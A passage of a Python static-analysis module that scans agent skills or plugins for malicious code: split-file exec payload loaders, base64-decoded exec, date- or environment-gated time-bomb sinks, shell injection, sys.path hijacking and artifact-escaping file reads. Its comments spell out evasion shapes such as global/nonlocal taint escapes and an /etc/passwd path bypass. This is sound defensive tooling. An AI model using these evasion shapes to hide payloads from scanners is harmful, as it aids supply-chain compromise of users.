    _toplevel_classes = [n for n in getattr(tree, "body", []) if isinstance(n, ast.ClassDef)]
    owner_map, parent_scope = _build_toplevel_owner_map(_toplevel_funcs, _toplevel_classes)
    shadow_cache: dict = {}
    assigns = [n for n in ast.walk(tree) if isinstance(n, ast.Assign)]

    def _propagate(seed_names: set) -> dict:
        """The same scope-aware taint fixpoint as before, but seeded ONLY from calls to
        `seed_names` (a subset of composing_names) rather than every composing helper in
        the file -- lets the caller ask "what does exactly THIS helper's return value
        taint," so leg-3 evidence can be attributed per-helper instead of unioned across
        every composing helper (the B-417 bug this fixes). Returns the same
        `owning-scope -> tainted names` shape the original single combined fixpoint did."""
        tainted: dict = {}  # owning scope node (or None = module level) -> tainted names
        for _ in range(6):
            changed = False
            for a in assigns:
                hop = any(
                    isinstance(sub, ast.Call)
                    and isinstance(sub.func, ast.Name)
                    and sub.func.id in seed_names
                    for sub in ast.walk(a.value)
                )
                visible = _tainted_names_visible(a, tainted, owner_map, parent_scope, shadow_cache)
                if not (hop or (_names_in(a.value) & visible)):
                    continue
                scope = owner_map.get(a)
                global_names = _global_declared_names(scope, owner_map) if scope is not None else set()
                nonlocal_names = (
                    _nonlocal_declared_names(scope, owner_map) if scope is not None else set()
                )
                for t in a.targets:
                    if not isinstance(t, ast.Name):
                        continue
                    if t.id in global_names:
                        bucket_keys = [None]
                    elif t.id in nonlocal_names:
                        targets = _nonlocal_target_scopes(
                            t.id, scope, parent_scope, owner_map, shadow_cache, {}
                        )
                        if not targets:
                            targets = []
                            ancestor = parent_scope.get(scope)
                            while ancestor is not None:
                                targets.append(ancestor)
                                ancestor = parent_scope.get(ancestor)
                        bucket_keys = targets
                    else:
                        bucket_keys = [scope]
                    for key in bucket_keys:
                        bucket = tainted.setdefault(key, set())
                        if t.id not in bucket:
                            bucket.add(t.id)
                            changed = True
            if not changed:
                break
        return tainted

    # One fixpoint per composing helper, each seeded ONLY from that helper's own calls
    # -- isolates every helper's taint from every OTHER composing helper's, so a sink
    # fed by helper A never inherits helper B's (possibly chunked) paths just because
    # both live in the same file.
    tainted_by_helper = {name: _propagate({name}) for name in composing_names}

    found: list = []
    for node in ast.walk(tree):
        if not isinstance(node, ast.Call):
            continue
        f = node.func
        if not (isinstance(f, ast.Name) and f.id in _EXEC_NAMES):
            continue

        call_arg_nodes = [
            n
            for arg in list(node.args) + [kw.value for kw in node.keywords]
            for n in ast.walk(arg)
        ]
        feeding: set = set()
        for cname, tainted in tainted_by_helper.items():
            visible_tainted = _tainted_names_visible(
                node, tainted, owner_map, parent_scope, shadow_cache
            )
            any_t, _direct = _call_args_tainted(node, visible_tainted)
            inline = any(
                isinstance(n, ast.Call) and isinstance(n.func, ast.Name) and n.func.id == cname
                for n in call_arg_nodes
            )
            if any_t or inline:
                feeding.add(cname)
        if not feeding:
            continue

        # fed_paths is the union of ONLY the helper(s) actually feeding THIS call --
        # e.g. `exec(a() + b())` still unions a's and b's paths (both genuinely feed
        # it), but a THIRD, unrelated composing helper elsewhere in the file never
        # contributes, however chunk-shaped ITS own paths happen to look (B-417).
        fed_paths = []
        for cname in feeding:
            for p in composing[cname]:
                if p not in fed_paths:
                    fed_paths.append(p)
        if not _paths_are_chunked(fed_paths):
            continue
        extra = "..." if len(fed_paths) > 3 else ""
        found.append(
            (
                getattr(node, "lineno", 0),
                f"exec()/eval() executes content assembled by reading {len(fed_paths)} "
                f"chunked files ({', '.join(fed_paths[:3])}{extra}) — split-by-file "
                "payload-loader shape",
            )
        )
    return found


# F-058: code-level time-bomb / sandbox-evasion. Narrow on purpose — wall-clock date
# (datetime.now()/date.today()/utcnow) and environment presence (os.environ / os.getenv)
# only; NOT time.time() elapsed-timeouts or sys.platform checks, which are ordinary flow.
_TIMEBOMB_DATE_HINTS = {"now", "today", "utcnow", "fromtimestamp", "datetime", "date"}


def _suspicious_guard_kind(test: ast.AST) -> str:
    """Classify an `if` test as a date/time or environment gate; '' if neither."""
    for n in ast.walk(test):
        if isinstance(n, ast.Attribute):
            if n.attr in _TIMEBOMB_DATE_HINTS:
                return "a wall-clock date"
            if n.attr in ("environ", "getenv"):
                return "an environment-variable"
        if isinstance(n, ast.Name) and n.id in _TIMEBOMB_DATE_HINTS:
            return "a wall-clock date"
    return ""


def _resolve_name_binding(name: str, tree: ast.AST) -> ast.AST | None:
    """A single assignment to `name` ANYWHERE in the file, mirroring
    _single_list_bindings_local's discipline but for any RHS shape (not just
    list/tuple) and whole-file rather than scope-aware -- a smaller apparatus,
    acceptable here since ambiguity from a same-named local in a different scope
    only ever makes this MORE conservative: 2+ assignments return None (treated as
    "not provably constant"), never a false resolution to "safe"."""
    candidates = [
        n.value
        for n in ast.walk(tree)
        if isinstance(n, ast.Assign)
        for t in n.targets
        if isinstance(t, ast.Name) and t.id == name
    ]
    return candidates[0] if len(candidates) == 1 else None


def _is_pure_constant_expr(node, tree: ast.AST, _depth: int = 0) -> bool:
    """C-199: True when `node` is provably a compile-time-constant expression -- a
    literal, a list/tuple of literals, string concatenation of literals, an
    f-string with no interpolation, or a bare Name resolved to exactly one such
    binding elsewhere in the file (bounded recursion via `_depth`). Used to gate
    _shell_injection_risk_findings: a subprocess/os.system call whose command is
    fully literal has nothing an attacker could inject through, regardless of
    shell=True."""
    if node is None:
        return True
    if isinstance(node, ast.Constant):
        return True
    if isinstance(node, (ast.List, ast.Tuple)):
        return all(_is_pure_constant_expr(e, tree, _depth + 1) for e in node.elts)
    if isinstance(node, ast.BinOp) and isinstance(node.op, ast.Add):
        return _is_pure_constant_expr(
            node.left, tree, _depth + 1
        ) and _is_pure_constant_expr(node.right, tree, _depth + 1)
    if isinstance(node, ast.JoinedStr):
        return all(isinstance(v, ast.Constant) for v in node.values)
    if isinstance(node, ast.Name) and _depth < 4:
        binding = _resolve_name_binding(node.id, tree)
        # An unresolvable Name (a function parameter, an import, or 0/2+ candidate
        # assignments) is NOT the same as "no argument at all" -- must NOT recurse
        # into the `node is None` branch above (which would wrongly read "can't
        # resolve" as "provably constant"). The single most common source of real
        # dynamic input, a function parameter, is exactly this unresolvable case.
        if binding is None:
            return False
        return _is_pure_constant_expr(binding, tree, _depth + 1)
    return False


def _shell_injection_risk_findings(tree: ast.AST) -> list:
    """C-199 (SkillTrustBench T09 "insecure coding, no clear attack intent"): a
    subprocess.*(shell=True, ...) call, or a bare os.system()/os.popen() call, whose
    command is NOT a provable compile-time constant -- classic shell-injection-prone
    SHAPE (mirrors Bandit B602/B605), regardless of whether the dynamic part is
    PROVEN externally-tainted (that stronger case is TT5_CMD_INJECTION, crit ->
    FAIL). A skill that merely uses subprocess/os.system with an entirely literal
    command never fires -- there is nothing for an attacker to inject through.
    WARN-grade only; the checks engine never escalates this rule to FAIL on its own.
    """
    out = []
    bindings_by_call = _list_bindings_by_call(tree)
    for node in ast.walk(tree):
        if not isinstance(node, ast.Call):
            continue
        is_exec, exec_name = _is_exec_sink_call(node.func)
        if not is_exec or "." not in exec_name:  # bare exec()/eval() -- not this rule's scope
            continue
        if exec_name.startswith("os."):
            cmd = node.args[0] if node.args else None
            if _is_pure_constant_expr(cmd, tree):
                continue
            out.append(
                ASTFinding(
                    "SHELL_INJECTION_RISK",
                    "info",
                    getattr(node, "lineno", 0),
                    f"{exec_name}() runs a non-literal command through a shell — "
                    "shell-injection-prone shape",
                )
            )
            continue
        # subprocess.*: only unsafe-shaped calls -- shell=True (or an unprovable
        # dynamic shell= value), or a command that isn't a fixed argv list.
        shell_true = False
        for kw in node.keywords:
            if kw.arg == "shell":
                v = kw.value
                if not (isinstance(v, ast.Constant) and v.value is False):
                    shell_true = True
                break
        first = node.args[0] if node.args else None
        if isinstance(first, ast.Name):
            first = bindings_by_call.get(node, {}).get(first.id, first)
        if not shell_true:
            if isinstance(first, (ast.List, ast.Tuple)):
                continue  # safe argv-list form, shell not True -- out of scope here
            if not isinstance(first, (ast.Constant, ast.JoinedStr, ast.BinOp, ast.Name)):
                # Some other dynamically-computed command (e.g. shlex.split(x),
                # x.split()) -- without shell=True, can't safely assume a STRING-
                # command shape without deeper type inference; skip rather than risk
                # a false WARN on a common, actually-safe argv-producing idiom.
                continue
        if _is_pure_constant_expr(first, tree):
            continue
        shape = "shell=True" if shell_true else "string/name command form"
        out.append(
            ASTFinding(
                "SHELL_INJECTION_RISK",
                "info",
                getattr(node, "lineno", 0),
                f"{exec_name}() runs a non-literal command ({shape}) — "
                "shell-injection-prone shape",
            )
        )
    return out


def _conditional_sink_findings(tree: ast.AST) -> list:
    """A dangerous sink (exec/eval/os.system/subprocess or a network call) reachable only
    under a date/time or environment guard — the code-level time-bomb / sandbox-evasion
    pattern, distinct from B65's prose sleeper-trigger. WARN-grade (conditional execution
    has legit uses): the checks engine routes CONDITIONAL_SINK to a WARN, never an automatic FAIL."""
    out = []
    net_sink_aliases = _net_sink_alias_names(tree)
    for node in ast.walk(tree):
        if not isinstance(node, ast.If):
            continue
        kind = _suspicious_guard_kind(node.test)
        if not kind:
            continue
        found = False
        for stmt in (*node.body, *node.orelse):
            for sub in ast.walk(stmt):
                if isinstance(sub, ast.Call):
                    is_exec, sink = _is_exec_sink_call(sub.func)
                    if is_exec or _is_net_sink(sub.func, net_sink_aliases):
                        ln = getattr(sub, "lineno", getattr(node, "lineno", 0))
                        out.append(
                            ASTFinding(
                                "CONDITIONAL_SINK",
                                "info",
                                ln,
                                f"a dangerous sink ({sink or 'network call'}) runs only under {kind} "
                                "condition — possible time-bomb / sandbox-evasion gating",
                            )
                        )
                        found = True
                        break
            if found:
                break
    return out


def _names_in(node: ast.AST) -> set[str]:
    return {n.id for n in ast.walk(node) if isinstance(n, ast.Name)}


def _global_declared_names(fn: ast.AST, owner_map: dict) -> set[str]:
    """B-205 (C-135 finding 1) + B-209 (C-135 follow-up): names declared `global`
    within `fn`'s OWN scope. An assignment to one of these names writes to MODULE
    scope regardless of which function syntactically contains it — Python's actual
    `global` semantics — so it must be bucketed as module-level taint (visible
    everywhere), not scoped to the syntactically-nearest owning function. Without
    this, `global secret; secret = base64.b64decode(...)` in one function followed by
    `exec(secret)` in a DIFFERENT function silently stopped firing once per-function
    scoping landed — a real detection-bypass regression, not just a missed edge case.

    B-209: a raw `ast.walk(fn)` over `fn`'s ENTIRE subtree (the original B-205 shape)
    also picks up a `global X` declared inside a NESTED function within `fn` —
    wrongly promoting `fn`'s OWN separate, non-global local `X` to the module-wide
    bucket too, since both share the same bare name. Filtering by `owner_map` (B-210's
    per-nested-function scoping) restricts this to `global` statements owner_map
    itself attributes to `fn` directly; a `global` inside a deeper nested function
    belongs to THAT function's own scope and is resolved on its own pass when
    `_tainted_names` reaches it. See `_nonlocal_declared_names` for the sibling
    `nonlocal` case (C-135 on B-210) — deliberately NOT folded in here, since
    `nonlocal` needs different bucketing (see that function's docstring)."""
    return {
        n2
        for n in ast.walk(fn)
        if isinstance(n, ast.Global) and owner_map.get(n) is fn
        for n2 in n.names
    }


def _nonlocal_declared_names(fn: ast.AST, owner_map: dict) -> set[str]:
    """C-135 (on B-210): names declared `nonlocal` within `fn`'s OWN scope — same
    owner_map-filtered shape as `_global_declared_names`, but kept SEPARATE because
    `nonlocal` needs different bucketing in `_tainted_names`, not the same None/
    module-wide bucket `global` uses.

    `nonlocal X` rebinds SOME ENCLOSING function's own EXISTING local `X` (the
    nearest ancestor scope that itself binds `X` — required by Python's own syntax
    rules, so at least one exists) — not module scope. B-210's new per-nested-
    function scope buckets made this a real evasion: a helper nested inside `outer`
    doing `nonlocal payload; payload = base64.b64decode(...)`, read back and exec'd
    in `outer` right after, is genuine runtime taint flow (the write truly lands in
    `outer`'s own `payload` slot) that silently stopped firing once nested functions
    got their own bucket. Routing it through the None bucket like `global` (tried
    first, C-135 caught it) does NOT work: `_tainted_names_visible`'s shadow
    subtraction treats a scope's OWN local binding of the same name as blocking
    outer/module visibility — correct for `global` (a genuinely separate namespace,
    so an unrelated same-named local really does shadow it) but wrong for
    `nonlocal`, whose "outer" binding IS, by construction, that ancestor's own
    local — the exact thing shadow-subtraction was designed to protect, not defeat.
    `_tainted_names` therefore seeds the tainted name directly into the ancestor
    bucket(s) `_nonlocal_target_scopes` resolves, bypassing the chain-walk's shadow
    subtraction entirely.

    B-215: that seeding used to hit EVERY ancestor, which swept in a GRANDPARENT
    scope beyond the real target that happened to reuse the same bare name for its
    own unrelated local (narrow but real: 3+ nesting levels, exact bare-name reuse).
    The obvious "resolve to the nearest ancestor that binds the name" refinement was
    evaluated and rejected ONCE BEFORE, correctly: paired with the then whole-subtree
    shadow walk it made an INTERMEDIATE ancestor that merely READS the name lose
    visibility of it, trading the false positive for a worse false negative. That
    blocker was the subtree walk, not the refinement — with `_own_bound_names` now
    stopping at nested-function boundaries (B-214), a nested write no longer counts
    as an intermediate ancestor's own shadowing binding, so the precise resolution
    is finally sound. Both halves had to land together."""
    return {
        n2
        for n in ast.walk(fn)
        if isinstance(n, ast.Nonlocal) and owner_map.get(n) is fn
        for n2 in n.names
    }


def _nonlocal_target_scopes(
    name: str,
    scope: ast.AST,
    parent_scope: dict,
    owner_map: dict,
    own_bound_cache: dict,
    nonlocal_cache: dict,
) -> list:
    """B-215: the ancestor scope(s) a `nonlocal name` write inside `scope` actually
    lands in. Python binds it to the NEAREST enclosing function scope with its own
    binding for `name` — so a grandparent further out that merely reuses the same bare
    name for an unrelated local of its own is NOT written to and must not be seeded.

    An intermediate ancestor that itself declares `name` nonlocal is not the target
    either: it shares the very same cell, one level further out. Those are returned
    ALONGSIDE the real target (they genuinely see the write), not mistaken for it.

    Returns [] when no ancestor owns a binding. Valid Python guarantees one exists, so
    that means a binding form this module does not model; the caller then falls back to
    the old seed-every-ancestor over-approximation rather than dropping the taint,
    keeping any residual error in the false-positive direction instead of opening a
    detection hole."""
    shared: list = []
    ancestor = parent_scope.get(scope)
    while ancestor is not None:
        if ancestor not in nonlocal_cache:
            nonlocal_cache[ancestor] = _nonlocal_declared_names(ancestor, owner_map)
        if name in nonlocal_cache[ancestor]:
            shared.append(ancestor)  # same cell, real target is further out
        else:
            if ancestor not in own_bound_cache:
                own_bound_cache[ancestor] = _own_bound_names(ancestor)
            if name in own_bound_cache[ancestor]:
                return shared + [ancestor]
        ancestor = parent_scope.get(ancestor)
    return []


def _tainted_names(
    tree: ast.AST,
    composing: set[str] | None = None,
    owner_map: dict | None = None,
    parent_scope: dict | None = None,
    shadow_cache: dict | None = None,
) -> dict:
    """Names assigned from a decode/decompress expression — so a dynamic-eval call on
    `payload`, where `payload` was assigned `base64.b64decode(...)` earlier, is still
    recognised. `composing` (from _decode_composing_funcnames) extends this to an
    assignment from a call to a decode-composing wrapper, e.g. `payload = _decode(blob)`
    -- `owner_map`/`parent_scope`/`shadow_cache` (from _build_toplevel_owner_map)
    restrict that match to the composing names actually visible at each assignment's
    position, so a local parameter/nested-def/rebind that merely shares the wrapper's
    name is not conflated with it (C-135 round 3).

    B-205: returns a dict keyed by the owning scope node (a function at any nesting
    depth, a top-level class's own method, or None for module-level/`global`-declared
    assignments), NOT a flat set — a previous flat-set version let an unrelated
    same-named local in a DIFFERENT function collide (the same class of bug
    C-202/C-135 rounds 1+3 found and fixed for decode-composing FUNCTION names, left
    open here for this function's own inline-decode base case). A `global`-declared
    target always buckets to None regardless of its syntactic scope (C-135 finding 1
    — real `global` semantics, not the syntactic nesting owner_map otherwise uses;
    B-209: scoped to the assignment's OWN immediate function, not any top-level
    ancestor — see `_global_declared_names`). A `nonlocal`-declared target is instead
    seeded directly into the bucket of the ancestor scope Python would really rebind
    (B-215 — see `_nonlocal_declared_names` / `_nonlocal_target_scopes`).
    Use `_tainted_names_visible()` to resolve the subset actually visible at a call
    site's own scope, including via a genuine closure read of an enclosing scope's
    own tainted local (B-210)."""
    tainted: dict = {}
    composing = composing or set()
    owner_map = owner_map or {}
    parent_scope = parent_scope or {}
    shadow_cache = shadow_cache if shadow_cache is not None else {}
    global_cache: dict = {}
    nonlocal_cache: dict = {}
    for node in ast.walk(tree):
        if isinstance(node, ast.Assign):
            visible = _decode_composing_visible(node, composing, owner_map, parent_scope, shadow_cache)
            if _subtree_has_decode(node.value) or _subtree_calls_decode_composing(
                node.value, visible
            ):
                scope = owner_map.get(node)
                if scope is not None:
                    if scope not in global_cache:
                        global_cache[scope] = _global_declared_names(scope, owner_map)
                    global_names = global_cache[scope]
                    if scope not in nonlocal_cache:
                        nonlocal_cache[scope] = _nonlocal_declared_names(scope, owner_map)
                    nonlocal_names = nonlocal_cache[scope]
                else:
                    global_names = set()
                    nonlocal_names = set()
                for t in node.targets:
                    if isinstance(t, ast.Name):
                        if t.id in global_names:
                            tainted.setdefault(None, set()).add(t.id)
                        elif t.id in nonlocal_names:
                            targets = _nonlocal_target_scopes(
                                t.id, scope, parent_scope, owner_map, shadow_cache, nonlocal_cache
                            )
                            if not targets:
                                # Unresolvable binding form -- fall back to the
                                # pre-B-215 over-approximation (see that helper).
                                ancestor = parent_scope.get(scope)
                                while ancestor is not None:
                                    targets.append(ancestor)
                                    ancestor = parent_scope.get(ancestor)
                            for target_scope in targets:
                                tainted.setdefault(target_scope, set()).add(t.id)
                        else:
                            tainted.setdefault(scope, set()).add(t.id)
    return tainted


def _tainted_names_visible(
    node: ast.AST, tainted: dict, owner_map: dict, parent_scope: dict, shadow_cache: dict
) -> set[str]:
    """B-205: the tainted-name set visible at `node`'s position — names tainted by a
    module-level decode assignment, by node's own scope, or by any ENCLOSING scope
    along node's real lexical nesting chain (B-210 — a nested function still sees a
    genuine closure read of an outer function's own tainted local, not just its own
    bucket and the module-level one, mirroring `_decode_composing_visible`'s scoping
    model). B-211: an ancestor scope's tainted name only counts if nothing BETWEEN
    node and that ancestor locally shadows the same name (a module-level tainted name
    shadowed by a same-named function parameter or local reassignment no longer false
    fires — previously missing here even though `_decode_composing_visible` already
    did the analogous subtraction). Shadow is accumulated scope-by-scope walking
    OUTWARD (checking each ancestor's bucket BEFORE merging that ancestor's own
    shadow set into the running total) so a scope's own tainted assignment is never
    checked against its OWN shadow set — which would incorrectly treat a taint
    source as shadowing itself and silently drop a real closure read.

    B-261: a name `scope` declares `global` is not resolved by that outward walk at
    all — Python jumps straight to the module binding. Modelling it as a walk (which
    the first attempt at B-261 effectively did, by dropping the name from `scope`'s
    own shadow set and letting the ordinary chain walk proceed) reads every ENCLOSING
    FUNCTION's same-named local on the way out and produced a real false-positive
    FAIL. So the redirect is applied as a redirect: the name is shadowed for the whole
    chain, then taken from the module bucket directly. `nonlocal` needs nothing here —
    it resolves to an ancestor that, by Python's own syntax rules, binds the name and
    therefore ends the walk itself (see `_own_bound_names`)."""
    scope = owner_map.get(node)
    if scope is None:
        return set(tainted.get(None, ()))

    def get_shadow(s: ast.AST) -> set[str]:
        if s not in shadow_cache:
            shadow_cache[s] = _own_bound_names(s)
        return shadow_cache[s]

    # Names `scope` declares `global` in its OWN body (owner_map-filtered, so a
    # declaration inside a nested function is not attributed here — B-209).
    global_here = _global_declared_names(scope, owner_map)

    visible = set(tainted.get(scope, ()))
    # `get_shadow` has already subtracted `global_here` (it is not a local binding);
    # add it back for the chain walk, because no enclosing FUNCTION's binding of the
    # name is reachable from here whatever else the chain does or does not bind.
    cumulative_shadow = set(get_shadow(scope)) | global_here
    ancestor = parent_scope.get(scope)
    while True:
        bucket = tainted.get(ancestor, set())
        visible |= (bucket - cumulative_shadow) if cumulative_shadow else bucket
        if ancestor is None:
            break
        cumulative_shadow |= get_shadow(ancestor)
        ancestor = parent_scope.get(ancestor)
    # The redirect itself: a `global`-declared name IS the module binding, so it is
    # visible whenever that binding is tainted — no accumulated shadow can hide it.
    if global_here:
        visible |= set(tainted.get(None, ())) & global_here
    return visible


def _attr_base(value: ast.AST) -> str:
    if isinstance(value, ast.Name):
        return value.id.lower()
    if isinstance(value, ast.Attribute):
        return value.attr.lower()
    return ""


# D1 (defensibility / import-path hijack): world-writable prefixes an attacker on the
# same host can typically write to, so a sys.path entry rooted there is hijackable.
_WRITABLE_PATH_PREFIXES = ("/tmp/", "/var/tmp/", "/private/tmp/", "/dev/shm/")


def _is_sys_path_mutation(call: ast.Call) -> ast.AST | None:
    """If `call` is sys.path.insert(...)/sys.path.append(...), return the path-argument
    node (the location being added to the import search path); else None."""
    f = call.func
    if not (
        isinstance(f, ast.Attribute)
        and f.attr in ("insert", "append")
        and isinstance(f.value, ast.Attribute)
        and f.value.attr == "path"
        and isinstance(f.value.value, ast.Name)
        and f.value.value.id == "sys"
    ):
        return None
    if f.attr == "insert":
        return call.args[1] if len(call.args) >= 2 else None
    return call.args[0] if call.args else None


def _is_writable_import_path(node: ast.AST) -> bool:
    """True if a sys.path entry is attacker-influenceable — a relative or world-writable
    string literal, or a value derived from an environment variable. The benign self-dir
    form (anchored on __file__) is NOT flagged here: install-directory writability is a
    separate defensibility signal, not an import-path hijack via an untrusted location.
    """
    if any(isinstance(x, ast.Name) and x.id == "__file__" for x in ast.walk(node)):
        return False
    if isinstance(node, ast.Constant) and isinstance(node.value, str):
        p = node.value
        if p.startswith(_WRITABLE_PATH_PREFIXES) or p in ("/tmp", "/var/tmp"):
            return True
        return not p.startswith("/")  # relative path -> resolves against the CWD
    if _rhs_has_subscript_environ(node) or any(_is_env_read_value(x) for x in ast.walk(node)):
        return True
    return False


# B-640: OBFUSCATED_EXEC (below) treats `_subtree_has_decode` alone as proof of a
# hidden payload. That is right for a real content-hiding primitive (base64/hex/b85/
# zlib/... in _DECODE_FUNCS) or an XOR-built sequence, but `_subtree_has_decode` ALSO
# matches the bare `.decode(...)` method -- and `exec(fh.read().decode("utf-8"), ns)`
# is exactly how `setup.py` reads a sibling `__version__.py` in requests/urllib3/
# hundreds of real packages, and how a migrations runner reads its own migration
# files. `.decode("utf-8")` over a LOCAL file read is not obfuscation; it is a
# bytes->str conversion of the artifact's own bundled content.
#
# B-752/B-850: the original version of this carve-out treated the mere PRESENCE of a
# `__file__` token anywhere in the path expression as proof the read stayed inside the
# artifact -- a token-presence check an attacker satisfies as easily as an author does
# (`os.path.join(os.path.dirname(__file__), "..", "..", "/etc/passwd")` passed it).
# B-752 narrowed that to a blocklist (refuse a few provable escape shapes); six C-135
# rounds on task/b-850 later, it is now the ALLOWLIST recognizer documented in the "B-
# 850: artifact-containment ALLOWLIST recognizer" module comment above -- positively
# prove the path is a bounded construction from `__file__` over a closed set of
# syntactic shapes, or grant no exemption at all. It still has no way to confirm the
# resolved path is really a file PRESENT in the artifact (the caller,
# checks/_vet.py's `installed_skill_py`, already enumerates every path in the artifact
# but that set is never threaded into `analyze_python()`) -- deferred, same reasoning
# as before: it widens `analyze_python()`'s signature and both of its call sites
# (checks/_vet.py, checks/_mcp.py), a bigger change than this carve-out needs. A
# literal or env/argv-derived path (the dropper shape: `open("/tmp/x.py", "rb")`)
# never resolves to the `__file__` anchor and is therefore never exempted.
#
# B-638: a precise version of that containment check exists too --
# `shippedexec.ShippedArtifact`, passed as `analyze_python(artifact=...)`
# by check_installed_skills, vet_plugin and the judge-packet builder. When
# it is passed, this recognizer is NOT consulted at either exec site (it
# absolved `join(here, os.environ["P"])`, whose absolute value discards
# the anchor); it remains only for a caller that cannot say what the
# artifact holds.
##############################################################################
# B-850: artifact-containment ALLOWLIST recognizer.
#
# Replaces B-752's blocklist verdict (`_path_expr_is_dunder_file_relative` and its
# supporting predicates -- six C-135 rounds on task/b-850, each patch closing one
# bypass shape while another stayed open or opened up, because a blocklist asks "does
# a RECOGNIZED escape shape prove this leaves the artifact?" and is permissive by
# default: an unrecognized shape gets the exemption for free). This recognizer asks
# the opposite question -- "is this POSITIVELY a construction from the `__file__`
# anchor that provably stays inside the artifact?" -- over a CLOSED set of syntactic
# shapes, so an unrecognized shape gets NO exemption at all. That closes the
# blocklist's core defect: a shape neither side had thought of used to read as safe
# merely because a `__file__` token appeared somewhere in the expression.
#
# Four verdicts, worst-wins when an expression could take more than one value:
#   BOUNDED      literal anchor-relative, provably stays inside      -> exempt
#   UNPROVEN     anchored, but a segment is runtime-computed         -> WARN
#                (ARTIFACT_READ_UNPROVEN, never FAIL -- checks/_vet.py's B394)
#   ESCAPES      proven to leave the artifact, or a segment is a     -> crit stands
#                static value hidden behind an unfoldable expression
#                (hiding a static path IS itself the evasion signal)
#   NOT_ANCHORED does not start at the __file__ anchor at all, or is -> crit stands
#                a shape outside the recognized set
#
# Recognized shapes: an anchor (`__file__`, `dirname(...)`/`.parent`/`.parents[N]`,
# `os.path.split(x)[0]`), a join (`os.path.join`, pathlib multi-arg constructors,
# `.joinpath`, `/`, including starred splices from a literal list/tuple), string
# building (`+`, f-strings without a format spec beyond `!s`, `%s`/`%d`/`%%`-only
# %-format, `{}`/`{n}`-only str.format, `"sep".join(<literal list>)`), literal
# folding (string methods / `.decode()` on literal operands, `os.pardir`/`os.curdir`/
# `os.sep`), the named idioms (`getattr(sys, "_MEIPASS", A)`, `os.getcwd()`/
# `Path.cwd()`, `.with_name`/`.with_suffix`/`.with_stem`, the `A or "."` truthiness
# idiom), bounded loops (a literal tuple/list, `sorted`/`list`/`reversed` of one,
# `os.listdir`, `glob`/`.glob`/`.rglob`/`.iterdir`), and one level of local-helper
# inlining (a plain module-level `def`, no decorators/varargs/kwonly/yield/global,
# depth <= 3) -- a function PARAMETER resolves to "runtime" PLUS every literal
# argument an in-file call site actually passes (this can only RAISE a verdict,
# never lower one). A `.read()`/`.readline()` receiver must resolve, through every
# reaching definition of its name, to `open`/`io.open`/`Path.open()`.
#
# STRICT name resolution only: a function body resolves module-level imports,
# module-level `def`s, and `__file__` itself -- a module-level VALUE referenced
# inside a function (`HERE = dirname(__file__)` read inside a later `def`) stays
# unresolved/runtime, matching this project's pre-B-850 behavior for that one case.
# (The architect's "full mode", which also resolves module-level values inside
# functions, was explicitly deferred as a separate follow-up.)
#
# Path values are tracked as components-relative-to-root plus an explicit `up`
# counter (NOT a clamped subtraction -- that is what hid a "climb above root then
# descend into a sibling" bypass). An absolute/home/CWD/anchor operand RESTARTS the
# tracked path. Text concatenated with NO separator REPLACES the last component
# (not appends -- `dirname(__file__) + "_evil/x.py"` lands in a SIBLING directory
# with zero `..`, which append-semantics would miss entirely). `dirname()`/`.parent`
# remove the last lexical component, including a literal `..` if present, matching
# real filesystem semantics.
#
# Fail-closed budgets throughout (`_ContainmentBudget`, mirroring this module's
# `_AnchorBudgetExhausted` discipline); any budget exhaustion, `RecursionError`, or
# unexpected internal error is read as ESCAPES -- never a silent exemption.
##############################################################################

_CONTAINMENT_BOUNDED = "BOUNDED"
_CONTAINMENT_UNPROVEN = "UNPROVEN"
_CONTAINMENT_ESCAPES = "ESCAPES"
_CONTAINMENT_NOT_ANCHORED = "NOT_ANCHORED"
_CONTAINMENT_RANK = {
    _CONTAINMENT_BOUNDED: 0,
    _CONTAINMENT_UNPROVEN: 1,
    _CONTAINMENT_ESCAPES: 2,
    _CONTAINMENT_NOT_ANCHORED: 3,
}

_CONTAINMENT_MAX_HOPS = 64          # def-site reaching-definitions chain length
_CONTAINMENT_MAX_WORK = 5000        # total definition evaluations per classified read
_CONTAINMENT_MAX_ALTS = 256         # alternative fan-out (branches / call sites / IfExp)
_CONTAINMENT_MAX_EVAL_DEPTH = 100   # expression nesting
_CONTAINMENT_MAX_HELPER_DEPTH = 3   # nested local-helper inlining
_CONTAINMENT_MAX_CALLSITES = 16     # in-file call sites evaluated for one parameter


class _ContainmentBudget(Exception):
    """Any B-850 recognizer budget exhausted. Caught once, at the top, and read as
    ESCAPES -- fail-closed, never a silent exemption."""


# ---- abstract path values ------------------------------------------------------
_ContainmentStr = namedtuple("_ContainmentStr", "s")           # statically known text
_ContainmentOpq = namedtuple("_ContainmentOpq", "kind why")    # kind: runtime|static|unrecognized
_ContainmentSeq = namedtuple("_ContainmentSeq", "elts")        # list/tuple literal (tuple of alt-tuples)
_ContainmentCat = namedtuple("_ContainmentCat", "pieces")      # string concat, not yet a path
_ContainmentSafe = namedtuple("_ContainmentSafe", "")          # one real dir entry (listdir element)
_ContainmentPV = namedtuple("_ContainmentPV", "root up comps trailing unk obf why")
# root: anchor | abs | rel | home | cwd | unknown
_CONTAINMENT_UNK, _CONTAINMENT_SAFE_MARK = "\x00UNK", "\x00SAFE"
_CONTAINMENT_GLUE, _CONTAINMENT_VFILE = "\x00GLUE", "\x00VFILE"


def _containment_pv(root, up=0, comps=(), trailing=False, unk=False, obf=False, why=""):
    return _ContainmentPV(root, up, tuple(comps), trailing, unk, obf, why)


def _containment_key(v):
    if isinstance(v, (_ContainmentOpq, _ContainmentPV)):
        return v._replace(why="")
    return v


def _containment_dedupe(vals):
    seen, out = set(), []
    for v in vals:
        k = _containment_key(v)
        if k not in seen:
            seen.add(k)
            out.append(v)
    if len(out) > _CONTAINMENT_MAX_ALTS:
        raise _ContainmentBudget("alternatives")
    return out


def _containment_product(alt_lists):
    combos = [()]
    for alts in alt_lists:
        combos = [c + (a,) for c in combos for a in alts]
        if len(combos) > _CONTAINMENT_MAX_ALTS:
            raise _ContainmentBudget("alternatives")
    return combos


# ---- path algebra ----------------------------------------------------------------
def _containment_split_lit(s):
    t = s.replace("\\", "/")
    return [c for c in t.split("/") if c not in ("", ".")], t.endswith("/")


def _containment_parse_lit(s):
    t = s.replace("\\", "/")
    if t.startswith("/") or re.match(r"^[A-Za-z]:/", t):
        return _containment_pv("abs", why=f"absolute literal {s[:40]!r}")
    comps, trailing = _containment_split_lit(s)
    return _containment_pv("rel", comps=comps, trailing=trailing, why=f"CWD-relative literal {s[:40]!r}")


def _containment_push(p, comps, trailing=False, unk=False, obf=False):
    return p._replace(comps=p.comps + tuple(comps), trailing=trailing,
                       unk=p.unk or unk or _CONTAINMENT_UNK in comps, obf=p.obf or obf)


def _containment_as_path(v):
